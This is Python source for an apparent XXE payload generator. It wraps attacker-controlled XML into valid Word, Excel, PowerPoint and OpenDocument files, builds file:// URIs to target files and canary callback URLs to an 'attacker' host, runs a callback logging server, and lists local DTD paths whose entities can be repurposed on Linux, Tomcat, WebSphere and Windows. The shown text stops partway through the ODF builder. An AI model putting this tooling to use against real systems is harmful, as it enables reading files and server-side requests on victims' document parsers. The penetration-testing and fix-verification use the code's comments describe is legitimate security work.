#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import argparse
import base64
import hashlib
import json
import os
import re
import struct
import sys
import textwrap
import threading
import time
import uuid
import zipfile
import zlib
import xml.etree.ElementTree as ET
import xml.parsers.expat as expat
from typing import Dict, List, Optional, Tuple
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import quote, urlparse, parse_qs
from xml.sax.saxutils import quoteattr, escape


VERSION = "2.3"

# [v2.3][P3] --json 时信息输出走 stderr，stdout 只保留纯 JSON
_JSON_MODE = False


def emit(msg: str = "") -> None:
    print(msg, file=sys.stderr if _JSON_MODE else sys.stdout)


# 回调日志写入锁（[P1-8] ThreadingHTTPServer 多线程写同一文件必须加锁）
_LOG_LOCK = threading.Lock()

CANARY_KINDS = "file|ssrf|dns|probe|oob|param"
CANARY_LABEL_RE = re.compile(
    r"^(?P<cat>[a-z0-9]+?)"
    r"(?:-(?P<kind>" + CANARY_KINDS + r"))?"
    r"(?:-(?P<slug>[0-9a-z]{6}))?"
    r"-(?P<rid>[0-9a-f]{8})$"
)

_IPV4_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")


def is_ip_literal(host: str) -> bool:
    """
    [A3] 判断 attacker 主机是否为 IP 字面量。

    v2.1 的 canary 一律构造成 http://{label}.{attacker_host}。
    当 attacker 是 IP 时，该主机名在 DNS 上根本不存在，
    benign / verify_fix 必然零回连 —— 而"零回连"在本工具语义里等于"已修复"。
    这是整套工具里最危险的假阴性来源：目标其实漏洞百出，报告却说修好了。
    """
    h = (host or "").strip()
    if h.startswith("["):
        return h.find("]") != -1
    if _IPV4_RE.match(h):
        try:
            return all(0 <= int(x) <= 255 for x in h.split("."))
        except ValueError:
            return False
    if h.count(":") >= 2:          # 裸 IPv6
        return True
    return False


def _iso_now() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%S%z")


# ============================================================================
# 第一部分：辅助函数（含 [P1-2] [P1-3] 修复）
# ============================================================================

def xml_attr(value: str) -> str:
    """
    返回可直接嵌入 XML 的、带引号且已转义的属性值。

    [P1-2] 修复：v2.0 直接把 f'{uri}' 塞进 SYSTEM "..." 与 schemaLocation="...",
    当 --target-file 含 " & < > 时产出的 XML 连良构性都不满足，
    目标解析器在 DOCTYPE 阶段就 fatal error，测试直接失败。
    """
    return quoteattr(value or "")


def xml_attr_dq(value: str) -> str:
    """
    始终用双引号包裹的属性值。

    用于外层已使用单引号的上下文（例如内部 DTD 子集中的
    <!ENTITY % name '...'>），避免 quoteattr 在遇到含引号的路径时
    回退成单引号定界符导致提前闭合。
    """
    return '"' + escape(value or "", {'"': "&quot;", "'": "&apos;"}) + '"'


def xml_text(value: str) -> str:
    """转义 XML 文本内容。"""
    return escape(value or "", {'"': "&quot;"})


_PATH_SAFE = "/:@!$&'()*+,;=~-._"


def normalize_file_uri(target_file: str) -> str:
    """
    把用户给的路径转成 file:// URI。

    [P1-3] 修复：
      - UNC 路径 \\\\srv\\share\\a.txt  v2.0 产出 file:////srv/share/a.txt（四斜杠，错误）
                                        应为 file://srv/share/a.txt
      - 空格 / 中文 / 特殊字符未百分号编码，Java 的 new URL() 会抛
        IllegalArgumentException，外带静默失败
    """
    if target_file.startswith("file:"):
        return target_file

    t = (target_file or "").replace("\\", "/")

    # UNC: //server/share/path
    if t.startswith("//"):
        rest = t[2:].lstrip("/")
        parts = rest.split("/", 1)
        server = parts[0]
        tail = "/" + parts[1] if len(parts) > 1 else ""
        return "file://" + server + quote(tail, safe=_PATH_SAFE)

    # Windows 盘符: C:/Windows/win.ini
    if len(t) >= 2 and t[1] == ":" and t[0].isalpha():
        drive = t[0].lower()
        tail = t[2:]
        if not tail.startswith("/"):
            tail = "/" + tail
        return "file:///" + drive + ":" + quote(tail, safe=_PATH_SAFE)

    # Unix 绝对路径
    if t.startswith("/"):
        return "file://" + quote(t, safe=_PATH_SAFE)

    # 相对路径
    return "file:///" + quote(t, safe=_PATH_SAFE)


def safe_filename(filename: str) -> str:
    """
    文件名消毒。保留 CJK 字符（v2.0 会把中文全部替换成 _，导致产物名退化）。
    """
    cleaned = []
    for ch in str(filename):
        if ch.isalnum() or ch in ("-", "_", "."):
            cleaned.append(ch)
        elif ord(ch) > 0x2FFF or 0x4E00 <= ord(ch) <= 0x9FFF:
            cleaned.append(ch)
        else:
            cleaned.append("_")
    out = "".join(cleaned).strip("._")
    return out[:120] or "payload"


def extract_host(url: str) -> str:
    """
    提取 host[:port]。

    v2.1 用 split(":")[0] 一刀切，对 IPv6（http://[::1]:8080）会截出 "["。
    这里先处理方括号形式，再只在"冒号后为纯数字"时剥离端口。
    """
    cleaned = re.sub(r"^[a-zA-Z][a-zA-Z0-9+.\-]*://", "", url or "")
    cleaned = cleaned.split("/")[0].split("?")[0].split("#")[0]
    if cleaned.startswith("["):
        end = cleaned.find("]")
        if end != -1:
            return cleaned[:end + 1]
    if cleaned.count(":") == 1:
        h, _, p = cleaned.partition(":")
        if p.isdigit():
            return h
    return cleaned


def extract_netloc(url: str) -> str:
    """
    提取 host[:port] 原样（保留端口与 IPv6 方括号），用于拼接 URL。

    extract_host 会剥掉端口，直接拿它拼 canary 会把 :8080 弄丢
    （v2.1 就有这个问题：-a http://1.2.3.4:8080 生成的 canary 走的是 80 端口）。
    """
    cleaned = re.sub(r"^[a-zA-Z][a-zA-Z0-9+.\-]*://", "", url or "")
    return cleaned.split("/")[0].split("?")[0].split("#")[0]


def dtd_system_uri(path: str) -> str:
    """
    Local DTD 的 SYSTEM 标识符统一走 URI 归一化。

    v2.1 直接把数据库里的裸路径塞进 SYSTEM，Windows 素材产出
        <!ENTITY % local_dtd SYSTEM "C:/Windows/System32/wbem/xml/cim20.dtd">
    Java 的 new URL() 会抛 IllegalArgumentException，整条链静默失败。
    jar: 等本身已是合法 URI 的协议保持原样（含 !/ 分隔，不能当路径处理）。
    """
    if re.match(r"^[a-zA-Z][a-zA-Z0-9+.\-]*://", path or ""):
        return path
    return normalize_file_uri(path)


def ensure_dir(path: str) -> None:
    os.makedirs(path, exist_ok=True)


# ============================================================================
# 第二部分：本地 DTD 数据库（[P2-5] 扩充）
# ============================================================================
# platforms / systems 改为列表，允许一条素材命中多个平台；
# 当某平台过滤后为空时回落到 cross-platform 分组，避免 php / dotnet 返回空列表。

LOCAL_DTD_DATABASE: List[Dict] = [
    {
        "system": "Linux / 通用 (fontconfig)",
        "path": "/usr/share/xml/fontconfig/fonts.dtd",
        "entity": "expr",
        "platforms": ["java", "php", "dotnet"],
        "systems": ["linux"],
        "cross": True,
        "note": "fontconfig 几乎在所有 Linux 发行版存在，命中率最高的通用素材",
    },
    {
        "system": "Linux / GNOME (gconf)",
        "path": "/usr/share/gconf/schema/desktop-defaults.dtd",
        "entity": "ISOamso",
        "platforms": ["java", "php", "dotnet"],
        "systems": ["linux"],
        "cross": True,
    },
    {
        "system": "Linux / 文档工具链",
        "path": "/usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd",
        "entity": "ISOamso",
        "platforms": ["java", "php", "dotnet"],
        "systems": ["linux"],
        "cross": True,
        "note": "DocBook 4.5，装过文档工具链的主机常见",
    },
    {
        "system": "Linux / scrollkeeper",
        "path": "/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd",
        "entity": "ISOamsa",
        "platforms": ["java", "php", "dotnet"],
        "systems": ["linux"],
        "cross": True,
    },
    {
        "system": "Linux / dblatex",
        "path": "/usr/share/dblatex/dtd/docbookx.dtd",
        "entity": "ISOamso",
        "platforms": ["java", "php", "dotnet"],
        "systems": ["linux"],
        "cross": True,
    },
    {
        "system": "Android / 通用",
        "path": "/system/etc/fonts.xml",
        "entity": "family",
        "platforms": ["java"],
        "systems": ["linux"],
        "cross": False,
    },
    {
        "system": "Tomcat / J2EE (jsp-api)",
        "path": "jar:file:///usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd",
        "entity": "URI",
        "platforms": ["java"],
        "systems": ["linux", "windows"],
        "cross": False,
        "note": "jar: 协议在 Tomcat 8/9 环境命中率极高；路径需按实际安装目录调整",
    },
    {
        "system": "Tomcat / servlet-api",
        "path": "jar:file:///usr/local/tomcat/lib/servlet-api.jar!/javax/servlet/resources/XMLSchema.dtd",
        "entity": "xs-datatypes",
        "platforms": ["java"],
        "systems": ["linux", "windows"],
        "cross": False,
    },
    {
        "system": "IBM WebSphere",
        "path": "/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd",
        "entity": "ISOamso",
        "platforms": ["java"],
        "systems": ["linux"],
        "cross": False,
    },
    {
        "system": "Windows",
        "path": "C:/Windows/System32/wbem/xml/cim20.dtd",
        "entity": "CIMName",
        "platforms": ["java", "dotnet"],
        "systems": ["windows"],
        "cross": True,
        "note": "Windows 目标几乎一定存在，是 win 平台的首选素材",
    },
    {
        "system": "Windows / .NET Framework",
        "path": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/Config/machine.config",
        "entity": "configSections",
        "platforms": ["dotnet"],
        "systems": ["windows"],
        "cross": False,
    },
]


def load_custom_dtd_db(path: Optional[str]) -> List[Dict]:
    """[P3-2] 从外部 JSON 追加本地 DTD 素材。"""
    if not path:
        return []
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        items = data if isinstance(data, list) else data.get("dtds", [])
        for it in items:
            it.setdefault("platforms", ["java"])
            it.setdefault("systems", ["linux", "windows"])
            it.setdefault("cross", False)
            it.setdefault("note", "自定义素材")
        print(f"[+] 已加载自定义 DTD 素材: {len(items)} 条 -> {path}")
        return items
    except (OSError, ValueError) as e:
        print(f"[!] 加载自定义 DTD 数据库失败({path}): {e}")
        return []


def load_canary_map(path: Optional[str]) -> Dict[str, Dict]:
    """[A4] --serve 时载入 canary_map.json，用于在回调日志里回填产物名。"""
    if not path:
        return {}
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, dict):
            print(f"[+] 已加载 canary 映射: {len(data)} 条 -> {path}")
            return data
        print(f"[!] canary 映射格式不正确（应为对象）: {path}")
    except (OSError, ValueError) as e:
        print(f"[!] 加载 canary 映射失败({path}): {e}")
    return {}


# ============================================================================
# 第三部分：OOXML / ODF / EPUB 合法容器模板
#           （[P1-4] [P1-5] 修复核心）
# ============================================================================
#
# v2.0 生成的 docx 只有 4 个部件、[Content_Types].xml 零个 Override、
# _rels/.rels 还指向一个从未写入的 docProps/app.xml。
# 这在 OPC 层面就是损坏包：Word 报"文件已损坏"，LibreOffice 转 PDF 直接丢弃，
# 于是 Payload 根本走不到 XML 解析器，整轮测试白做。
# 下面重建一份"主部件 + 样式 + 关系 + 可选元数据"的完整最小包。

_OOXML_MAIN = {
    "docx": (
        "word/document.xml",
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
    ),
    "xlsx": (
        "xl/workbook.xml",
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml",
    ),
    "pptx": (
        "ppt/presentation.xml",
        "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml",
    ),
}

# 每种容器允许的主部件注入点。
# v2.1 里 injection 与 kind 不匹配时会静默降级到 customXml：
# 用户以为在测 document.xml，实际测的是 customXml，结论完全跑偏。
_VALID_INJECTION = {
    "docx": ("customxml", "document", "coreprops"),
    "xlsx": ("customxml", "workbook", "coreprops"),
    "pptx": ("customxml", "slide", "coreprops"),
}

# 所有需要 Override 的部件 -> ContentType
_OOXML_CONTENT_TYPES = {
    "word/document.xml": "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
    "word/styles.xml": "application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml",
    "xl/workbook.xml": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml",
    "xl/worksheets/sheet1.xml": "application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml",
    "xl/styles.xml": "application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml",
    "ppt/presentation.xml": "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml",
    "ppt/slides/slide1.xml": "application/vnd.openxmlformats-officedocument.presentationml.slide+xml",
    "ppt/slideLayouts/slideLayout1.xml": "application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml",
    "ppt/slideMasters/slideMaster1.xml": "application/vnd.openxmlformats-officedocument.presentationml.slideMaster+xml",
    "ppt/theme/theme1.xml": "application/vnd.openxmlformats-officedocument.theme+xml",
    "docProps/core.xml": "application/vnd.openxmlformats-package.core-properties+xml",
    "customXml/item1.xml": "application/xml",
    "customXml/itemProps1.xml": "application/vnd.openxmlformats-officedocument.customXmlProperties+xml",
}

_REL_NS = "http://schemas.openxmlformats.org/package/2006/relationships"
_ODOC_REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"

WML_NS = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
A_NS = "http://schemas.openxmlformats.org/drawingml/2006/main"
P_NS = "http://schemas.openxmlformats.org/presentationml/2006/main"
SML_NS = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"


def _rels_xml(items: List[Tuple[str, str, str]]) -> str:
    body = "\n".join(
        f'  <Relationship Id="{rid}" Type="{rtype}" Target="{tgt}"/>'
        for rid, rtype, tgt in items
    )
    return (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        f'<Relationships xmlns="{_REL_NS}">\n{body}\n</Relationships>'
    )


def _content_types_xml(parts: List[str]) -> str:
    """按实际存在的部件生成 [Content_Types].xml（Default + Override）。"""
    overrides = "\n".join(
        f'  <Override PartName="/{p}" ContentType="{_OOXML_CONTENT_TYPES[p]}"/>'
        for p in sorted(parts) if p in _OOXML_CONTENT_TYPES
    )
    return (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">\n'
        '  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>\n'
        '  <Default Extension="xml" ContentType="application/xml"/>\n'
        f"{overrides}\n</Types>"
    )


def _ooxml_base_parts(kind: str, text: str) -> Dict[str, str]:
    """生成该 kind 的最小合法部件集合（不含 [Content_Types] / .rels / 注入部件）。"""
    safe_text = xml_text(text)

    if kind == "docx":
        return {
            "word/document.xml": (
                '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
                f'<w:document xmlns:w="{WML_NS}">\n'
                "  <w:body>\n"
                f'    <w:p><w:r><w:t xml:space="preserve">{safe_text}</w:t></w:r></w:p>\n'
                "    <w:sectPr/>\n"
                "  </w:body>\n"
                "</w:document>"
            ),
            "word/styles.xml": (
                '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
                f'<w:styles xmlns:w="{WML_NS}">\n'
                "  <w:docDefaults>\n"
                "    <w:rPrDefault><w:rPr>"
                '<w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>'
                '<w:sz w:val="22"/></w:rPr></w:rPrDefault>\n'
                "    <w:pPrDefault/>\n"
                "  </w:docDefaults>\n"
                '  <w:style w:type="paragraph" w:default="1" w:styleId="Normal">'
                '<w:name w:val="Normal"/><w:qFormat/></w:style>\n'
                "</w:styles>"
            ),
            "word/_rels/document.xml.rels": _rels_xml([
                ("rId1", f"{_ODOC_REL}/styles", "styles.xml"),
            ]),
        }

    if kind == "xlsx":
        return {
            "xl/workbook.xml": (
                '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
                f'<workbook xmlns="{SML_NS}" xmlns:r="{_ODOC_REL}">\n'
                '  <sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets>\n'
                "</workbook>"
            ),
            "xl/worksheets/sheet1.xml": (
                '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
                f'<worksheet xmlns="{SML_NS}">\n'
                "  <sheetData>\n"
                '    <row r="1">'
                f'<c r="A1" t="inlineStr"><is><t xml:space="preserve">{safe_text}</t></is></c>'
                "</row>\n"
                "  </sheetData>\n"
                "</worksheet>"
            ),
            "xl/styles.xml": (
                '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
                f'<styleSheet xmlns="{SML_NS}">\n'
                '  <fonts count="1"><font><sz val="11"/><name val="Calibri"/></font></fonts>\n'
                '  <fills count="1"><fill><patternFill patternType="none"/></fill></fills>\n'
                '  <borders count="1"><border><left/><right/><top/><bottom/><diagonal/></border></borders>\n'
                '  <cellStyleXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0"/></cellStyleXfs>\n'
                '  <cellXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/></cellXfs>\n'
                "</styleSheet>"
            ),
            "xl/_rels/workbook.xml.rels": _rels_xml([
                ("rId1", f"{_ODOC_REL}/worksheet", "worksheets/sheet1.xml"),
                ("rId2", f"{_ODOC_REL}/styles", "styles.xml"),
            ]),
        }

    # pptx：PowerPoint 要求 slide -> slideLayout -> slideMaster -> theme 完整链
    return {
        "ppt/presentation.xml": (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            f'<p:presentation xmlns:a="{A_NS}" xmlns:r="{_ODOC_REL}" xmlns:p="{P_NS}">\n'
            '  <p:sldMasterIdLst><p:sldMasterId id="2147483648" r:id="rId1"/></p:sldMasterIdLst>\n'
            '  <p:sldIdLst><p:sldId id="256" r:id="rId2"/></p:sldIdLst>\n'
            '  <p:sldSz cx="9144000" cy="6858000"/>\n'
            '  <p:notesSz cx="6858000" cy="9144000"/>\n'
            "</p:presentation>"
        ),
        "ppt/_rels/presentation.xml.rels": _rels_xml([
            ("rId1", f"{_ODOC_REL}/slideMaster", "slideMasters/slideMaster1.xml"),
            ("rId2", f"{_ODOC_REL}/slide", "slides/slide1.xml"),
            ("rId3", f"{_ODOC_REL}/theme", "theme/theme1.xml"),
        ]),
        "ppt/slides/slide1.xml": (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            f'<p:sld xmlns:a="{A_NS}" xmlns:r="{_ODOC_REL}" xmlns:p="{P_NS}">\n'
            "  <p:cSld><p:spTree>\n"
            '    <p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr>\n'
            "    <p:grpSpPr><a:xfrm>"
            '<a:off x="0" y="0"/><a:ext cx="0" cy="0"/>'
            '<a:chOff x="0" y="0"/><a:chExt cx="0" cy="0"/>'
            "</a:xfrm></p:grpSpPr>\n"
            '    <p:sp><p:nvSpPr><p:cNvPr id="2" name="Content"/>'
            '<p:cNvSpPr><a:spLocks noGrp="1"/></p:cNvSpPr><p:nvPr/></p:nvSpPr>'
            '<p:spPr><a:xfrm><a:off x="838200" y="365125"/>'
            '<a:ext cx="10515600" cy="1325563"/></a:xfrm>'
            '<a:prstGeom prst="rect"><a:avLst/></a:prstGeom></p:spPr>'
            '<p:txBody><a:bodyPr/><a:lstStyle/>'
            f'<a:p><a:r><a:rPr lang="en-US"/><a:t xml:space="preserve">{safe_text}</a:t></a:r></a:p>'
            "</p:txBody></p:sp>\n"
            "  </p:spTree></p:cSld>\n"
            "  <p:clrMapOvr><a:masterClrMapping/></p:clrMapOvr>\n"
            "</p:sld>"
        ),
        "ppt/slides/_rels/slide1.xml.rels": _rels_xml([
            ("rId1", f"{_ODOC_REL}/slideLayout", "../slideLayouts/slideLayout1.xml"),
        ]),
        "ppt/slideLayouts/slideLayout1.xml": (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            f'<p:sldLayout xmlns:a="{A_NS}" xmlns:r="{_ODOC_REL}" xmlns:p="{P_NS}" '
            'type="blank" preserve="1">\n'
            '  <p:cSld name="Blank"><p:spTree>\n'
            '    <p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr>\n'
            "    <p:grpSpPr><a:xfrm>"
            '<a:off x="0" y="0"/><a:ext cx="0" cy="0"/>'
            '<a:chOff x="0" y="0"/><a:chExt cx="0" cy="0"/>'
            "</a:xfrm></p:grpSpPr>\n"
            "  </p:spTree></p:cSld>\n"
            "  <p:clrMapOvr><a:masterClrMapping/></p:clrMapOvr>\n"
            "</p:sldLayout>"
        ),
        "ppt/slideLayouts/_rels/slideLayout1.xml.rels": _rels_xml([
            ("rId1", f"{_ODOC_REL}/slideMaster", "../slideMasters/slideMaster1.xml"),
        ]),
        "ppt/slideMasters/slideMaster1.xml": (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            f'<p:sldMaster xmlns:a="{A_NS}" xmlns:r="{_ODOC_REL}" xmlns:p="{P_NS}">\n'
            "  <p:cSld><p:spTree>\n"
            '    <p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr>\n'
            "    <p:grpSpPr><a:xfrm>"
            '<a:off x="0" y="0"/><a:ext cx="0" cy="0"/>'
            '<a:chOff x="0" y="0"/><a:chExt cx="0" cy="0"/>'
            "</a:xfrm></p:grpSpPr>\n"
            "  </p:spTree></p:cSld>\n"
            '  <p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" '
            'accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" '
            'accent6="accent6" hlink="hlink" folHlink="folHlink"/>\n'
            '  <p:sldLayoutIdLst><p:sldLayoutId id="2147483649" r:id="rId1"/></p:sldLayoutIdLst>\n'
            "</p:sldMaster>"
        ),
        "ppt/slideMasters/_rels/slideMaster1.xml.rels": _rels_xml([
            ("rId1", f"{_ODOC_REL}/slideLayout", "../slideLayouts/slideLayout1.xml"),
            ("rId2", f"{_ODOC_REL}/theme", "../theme/theme1.xml"),
        ]),
        "ppt/theme/theme1.xml": (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            f'<a:theme xmlns:a="{A_NS}" name="Office Theme">\n'
            "  <a:themeElements>\n"
            '    <a:clrScheme name="Office">'
            '<a:dk1><a:sysClr val="windowText" lastClr="000000"/></a:dk1>'
            '<a:lt1><a:sysClr val="window" lastClr="FFFFFF"/></a:lt1>'
            '<a:dk2><a:srgbClr val="44546A"/></a:dk2>'
            '<a:lt2><a:srgbClr val="E7E6E6"/></a:lt2>'
            '<a:accent1><a:srgbClr val="4472C4"/></a:accent1>'
            '<a:accent2><a:srgbClr val="ED7D31"/></a:accent2>'
            '<a:accent3><a:srgbClr val="A5A5A5"/></a:accent3>'
            '<a:accent4><a:srgbClr val="FFC000"/></a:accent4>'
            '<a:accent5><a:srgbClr val="5B9BD5"/></a:accent5>'
            '<a:accent6><a:srgbClr val="70AD47"/></a:accent6>'
            '<a:hlink><a:srgbClr val="0563C1"/></a:hlink>'
            '<a:folHlink><a:srgbClr val="954F72"/></a:folHlink>'
            "</a:clrScheme>\n"
            '    <a:fontScheme name="Office">'
            '<a:majorFont><a:latin typeface="Calibri Light"/><a:ea typeface=""/><a:cs typeface=""/></a:majorFont>'
            '<a:minorFont><a:latin typeface="Calibri"/><a:ea typeface=""/><a:cs typeface=""/></a:minorFont>'
            "</a:fontScheme>\n"
            '    <a:fmtScheme name="Office">'
            '<a:fillStyleLst>'
            '<a:solidFill><a:schemeClr val="phClr"/></a:solidFill>'
            '<a:solidFill><a:schemeClr val="phClr"/></a:solidFill>'
            '<a:solidFill><a:schemeClr val="phClr"/></a:solidFill>'
            "</a:fillStyleLst>"
            '<a:lnStyleLst>'
            '<a:ln w="6350"><a:solidFill><a:schemeClr val="phClr"/></a:solidFill><a:prstDash val="solid"/></a:ln>'
            '<a:ln w="12700"><a:solidFill><a:schemeClr val="phClr"/></a:solidFill><a:prstDash val="solid"/></a:ln>'
            '<a:ln w="19050"><a:solidFill><a:schemeClr val="phClr"/></a:solidFill><a:prstDash val="solid"/></a:ln>'
            "</a:lnStyleLst>"
            '<a:effectStyleLst><a:effectStyle><a:effectLst/></a:effectStyle>'
            '<a:effectStyle><a:effectLst/></a:effectStyle>'
            '<a:effectStyle><a:effectLst/></a:effectStyle></a:effectStyleLst>'
            '<a:bgFillStyleLst>'
            '<a:solidFill><a:schemeClr val="phClr"/></a:solidFill>'
            '<a:solidFill><a:schemeClr val="phClr"/></a:solidFill>'
            '<a:solidFill><a:schemeClr val="phClr"/></a:solidFill>'
            "</a:bgFillStyleLst>"
            "</a:fmtScheme>\n"
            "  </a:themeElements>\n"
            "  <a:objectDefaults/>\n"
            "  <a:extraClrSchemeLst/>\n"
            "</a:theme>"
        ),
    }


def create_ooxml_package(kind: str, payload: str, output_path: str,
                         injection: str = "customxml") -> None:
    """
    构造合法的 OOXML 包。

    injection:
        customxml  -> customXml/item1.xml（数据绑定 / custom XML 部件解析路径）
        document   -> word/document.xml（仅 docx；正文渲染路径）
        coreprops  -> docProps/core.xml（元数据抽取路径）
        workbook   -> xl/workbook.xml（Excel 打开路径）
        slide      -> ppt/slides/slide1.xml（PowerPoint 打开路径）
    """
    if kind not in _OOXML_MAIN:
        raise ValueError(f"不支持的 OOXML 类型: {kind}")
    if injection not in _VALID_INJECTION[kind]:
        raise ValueError(
            f"注入点 {injection!r} 不适用于 {kind}，"
            f"可选: {', '.join(_VALID_INJECTION[kind])}")

    main_part, _ = _OOXML_MAIN[kind]
    display_text = "PLACEHOLDER"

    parts: Dict[str, str] = dict(_ooxml_base_parts(kind, display_text))

    # 注入点
    if injection == "document":
        parts["word/document.xml"] = payload
    elif injection == "coreprops":
        parts["docProps/core.xml"] = payload
    elif injection == "workbook":
        parts["xl/workbook.xml"] = payload
    elif injection == "slide":
        parts["ppt/slides/slide1.xml"] = payload
    else:
        # 默认 / customxml：保留合法主部件，另挂 customXml
        parts["customXml/item1.xml"] = payload
        parts["customXml/itemProps1.xml"] = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" '
            'ds:itemID="{1CBB5C7A-1E8B-4D3E-9F2A-000000000001}">\n'
            "  <ds:schemaRefs/>\n"
            "</ds:datastoreItem>"
        )
        parts["customXml/_rels/item1.xml.rels"] = _rels_xml([
            ("rId1", f"{_ODOC_REL}/customXmlProps", "itemProps1.xml"),
        ])

    # 包级关系（[P1-4] v2.0 里的 docProps/app.xml 从未被写入，属悬空关系）
    rels: List[Tuple[str, str, str]] = [
        ("rId1", f"{_ODOC_REL}/officeDocument", main_part),
    ]
    n = 2
    if "docProps/core.xml" in parts:
        rels.append((f"rId{n}", f"{_REL_NS}/metadata/core-properties", "docProps/core.xml"))
        n += 1
    if "customXml/item1.xml" in parts:
        rels.append((f"rId{n}", f"{_ODOC_REL}/customXml", "customXml/item1.xml"))
        n += 1

    parts["_rels/.rels"] = _rels_xml(rels)
    parts["[Content_Types].xml"] = _content_types_xml(list(parts.keys()))

    ensure_dir(os.path.dirname(os.path.abspath(output_path)))
    with zipfile.ZipFile(output_path, "w", zipfile.ZIP_DEFLATED) as zf:
        # [Content_Types].xml 建议放在最前
        zf.writestr("[Content_Types].xml", parts.pop("[Content_Types].xml"))
        for name in sorted(parts):
            zf.writestr(name, parts[name])


# ----------------------------- ODF -----------------------------

ODF_OFFICE_NS = "urn:oasis:names:tc:opendocument:xmlns:office:1.0"

_ODF_MIMETYPES = {
    "odt": "application/vnd.oasis.opendocument.text",
    "ods": "application/vnd.oasis.opendocument.spreadsheet",
    "odp": "application/vnd.oasis.opendocument.presentation",
}

ODF_STYLES_XML = """<?xml version="1.0" encoding="UTF-8"?>
<office:document-styles \
xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" \
xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" \
xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" \
office:version="1.2">
  <office:styles>
    <style:default-style style:family="paragraph">
      <style:paragraph-properties style:writing-mode="page"/>
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt"/>
    </style:default-style>
    <style:style style:name="Standard" style:family="paragraph" style:class="text"/>
  </office:styles>
  <office:automatic-styles>
    <style:page-layout style:name="pm1">
      <style:page-layout-properties fo:page-width="21.001cm" fo:page-height="29.7cm" \
style:print-orientation="portrait" fo:margin-top="2cm" fo:margin-bottom="2cm" \
fo:margin-left="2cm" fo:margin-right="2cm"/>
    </style:page-layout>
  </office:automatic-styles>
  <office:master-styles>
    <style:master-page style:name="Default" style:page-layout-name="pm1"/>
  </office:master-styles>
</office:document-styles>"""

ODF_SETTINGS_XML = """<?xml version="1.0" encoding="UTF-8"?>
<office:document-settings \
xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" \
xmlns:config="urn:oasis:names:tc:opendocument:xmlns:config:1.0" \
office:version="1.2">
  <office:settings/>
</office:document-settings>"""


def create_odf_package(kind: str, payload: str, output_path: str,
                       mimetype: Optional[str] = None,
                       injection: str = "content") -> None:
    """
    [P1-5] v2.0 的 manifest 声明了 styles.xml / settings.xml 却从不写入，
    LibreOffice 会判定为损坏并拒绝打开。这里补齐全部必需部件。
    """
    if kind not in _ODF_MIMETYPES:
        raise ValueError(f"不支持的 ODF 类型: {kind}")
    mime = mimetype or _ODF_MIMETYPES[kind]

    normal_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:office="{ODF_OFFICE_NS}" \
xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" office:version="1.2">
  <office:body>
    <office:text><text:p>PLACEHOLDER</text:p></office:text>
  </office:body>
</office:document-content>"""

    normal_meta = f"""<?xml version="1.0" encoding="UTF-8"?>
<office:document-meta xmlns:office="{ODF_OFFICE_NS}" \
xmlns:dc="http://purl.org/dc/elements/1.1/" office:version="1.2">
